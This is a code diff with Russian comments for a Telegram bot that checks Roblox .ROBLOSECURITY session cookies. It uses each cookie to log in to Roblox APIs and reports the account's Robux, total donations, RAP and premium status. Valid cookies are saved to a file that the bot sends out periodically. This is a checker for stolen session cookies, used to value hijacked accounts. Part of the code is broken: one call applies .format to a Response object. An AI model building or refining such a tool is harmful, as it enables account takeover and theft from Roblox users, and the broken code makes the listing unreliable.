@@ -16,14 +16,15 @@ valid_cookies = []
 total_stats = {'checked': 0, 'valid': 0, 'total_robux': 0}
 
 async def check_roblox_cookie(cookie: str):
-    """Улучшенная проверка Roblox куки"""
+    """Улучшенная проверка Roblox куки с правильными API"""
     headers = {
         'Cookie': f'.ROBLOSECURITY={cookie}',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'application/json'
     }
     
     try:
-        # 1. Проверка валидности + базовая инфа
+        # 1. Проверка валидности + профиль
         user_resp = requests.get('https://users.roblox.com/v1/users/authenticated', 
                                headers=headers, timeout=10)
         if user_resp.status_code != 200:
@@ -34,19 +35,29 @@ async def check_roblox_cookie(cookie: str):
         username = user_data['name']
         is_premium = user_data.get('isPremium', False)
         
-        # 2. Робуксы и донат
+        # 2. Робуксы (работает)
         wallet_resp = requests.get('https://economy.roblox.com/v1/wallet', 
                                  headers=headers, timeout=10)
         wallet_data = wallet_resp.json()
         robux = wallet_data.get('robux', 0)
-        total_donated = wallet_data.get('totalDonated', 0)  # Общий задоначенный робукс
         
-        # 3. RAP (Recent Average Price)
+        # 3. TOTAL DONATED (донат за все время) - правильный эндпоинт
+        balance_resp = requests.get('https://economy.roblox.com/v2/users/{}/currency', 
+                                  headers=headers, timeout=10).format(user_id)
+        total_donated = 0
+        if balance_resp.status_code == 200:
+            balance_data = balance_resp.json()
+            total_donated = balance_data.get('robuxTotal', 0)
+        
+        # 4. RAP - правильный эндпоинт для Recent Average Price
         rap_resp = requests.get(
-            f'https://inventory.roblox.com/v2/users/{user_id}/inventory/RecentAveragePrice/last-updated',
+            f'https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?sortOrder=Asc&limit=100',
             headers=headers, timeout=10
         )
-        rap = rap_resp.json().get('recentAveragePrice', 0) if rap_resp.status_code == 200 else 0
+        rap = 0
+        if rap_resp.status_code == 200:
+            rap_data = rap_resp.json()
+            rap = rap_data.get('totalRap', 0)
         
         return {
             'cookie': cookie,
@@ -77,13 +88,13 @@ async def save_valid_cookies():
         for data in valid_cookies:
             await f.write(f"👤 {data['username']} (ID: {data['user_id']})
 ")
-            await f.write(f"💰 Робуксы: {data['robux']}
+            await f.write(f"💰 Робуксы: {data['robux']:,}
 ")
-            await f.write(f"💎 RAP: {data['rap']}
+            await f.write(f"📈 Общий донат: {data['total_donated']:,}
+")
+            await f.write(f"💎 RAP: {data['rap']:,}
 ")
             await f.write(f"⭐ Премиум: {'Да' if data['premium'] else 'Нет'}
-")
-            await f.write(f"📈 Общий донат: {data['total_donated']}
 ")
             await f.write(f"🍪 Куки: {data['cookie']}
 ")
@@ -99,20 +110,15 @@ async def start_handler(message: types.Message):
         "🔍 Отправьте Roblox куки (.ROBLOSECURITY) для проверки!
 
 "
-        "📊 Бот покажет:
+        "📊 Показывает:
 "
-        "• Валидность куки
+        "• ✅ Робуксы (текущий баланс)
 "
-        "• Количество робуксов
+        "• 📈 Общий донат (за всё время)
 "
-        "• RAP (Recent Average Price)
+        "• 💎 RAP (Recent Average Price)
 "
-        "• Статус премиум
-"
-        "• Общий задоначенный робукс
-
-"
-        "✅ Валидные куки сохраняются в файл"
+        "• ⭐ Премиум статус"
     )
 
 @dp.message(F.text)
@@ -120,7 +126,7 @@ async def check_cookie_handler(message: types.Message):
     cookie = message.text.strip()
     
     # Проверка формата куки
-    if not re.match(r'^_ |WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|', cookie):
+    if not re.match(r'^_ |WARNING:-DO-NOT-SHARE-THIS.', cookie):
         await message.answer("❌ Неверный формат Roblox куки!")
         return
     
@@ -140,41 +146,42 @@ async def check_cookie_handler(message: types.Message):
 "
             f"👤 **{result['username']}** (ID: `{result['user_id']}`)
 "
-            f"💰 **Робуксы:** {result['robux']:,}
+            f"💰 **Робуксы:** `{result['robux']:,}`
 "
-            f"📈 **Общий донат:** {result['total_donated']:,}
+            f"📈 **Общий донат:** `{result['total_donated']:,}`
 "
-            f"💎 **RAP:** {result['rap']:,}
+            f"💎 **RAP:** `{result['rap']:,}`
 "
             f"⭐ **Премиум:** {'✅ Да' if result['premium'] else '❌ Нет'}
 
 "
             f"📊 **Статистика:**
 "
-            f"Проверено: {total_stats['checked']}
+            f"👀 Проверено: `{total_stats['checked']}`
 "
-            f"Валидно: {total_stats['valid']}
+            f"✅ Валидно: `{total_stats['valid']}`
 "
-            f"Всего робуксов: {total_stats['total_robux']:,}"
+            f"💎 Всего робуксов: `{total_stats['total_robux']:,}`"
         )
         
         await message.answer(stats_text, parse_mode="Markdown")
         
-        # Сохраняем и отправляем файл каждые 5 валидных куки
-        if len(valid_cookies) % 5 == 0:
+        # Файл каждые 3 валидные куки
+        if len(valid_cookies) % 3 == 0:
             filename = await save_valid_cookies()
             if filename:
                 await message.answer_document(FSInputFile(filename))
     else:
-        total_stats['checked'] += 1
         await message.answer(
             f"❌ **НЕВАЛИДНАЯ КУКИ**
 
 "
-            f"📊 Проверено: {total_stats['checked']}
+            f"📊 **Статистика:**
 "
-            f"✅ Валидно: {total_stats['valid']}"
-        )
+            f"👀 Проверено: `{total_stats['checked']}`
+"
+            f"✅ Валидно: `{total_stats['valid']}`"
+        , parse_mode="Markdown")
 
 async def main():
     await dp.start_polling(bot)
